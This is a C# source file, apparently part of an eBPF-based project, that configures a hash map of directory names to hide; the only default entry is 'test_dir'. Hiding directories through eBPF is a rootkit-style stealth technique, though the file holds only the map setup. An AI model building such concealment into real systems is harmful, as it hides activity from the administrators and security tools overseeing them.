using System.Collections.ObjectModel;
using Deamon.Ebpf.Config;
using Deamon.Ebpf.Utils;
using Deamon.Utils;
using Mango.Interops;

namespace Deamon.Ebpf.Mapping;

internal sealed class MapCacheHideDir() : BaseMapConfig(BpfMapType.Hash)
{
    private static readonly ReadOnlyCollection<string> directories = ["test_dir"]; //use other.
    public override string Name => "hide_cache_dir";

    public override string Description => "Dir's to hide";

    public override IReadOnlyDictionary<byte[], byte[]> AddDefaultKeyValuesOnLoad()
        => directories.ToDictionary(str => StrUtils.ToFixedKeySize(str, EbpfConstant.DnameMaxBytes), str => EbpfUtils.ToBytes((byte)1));
}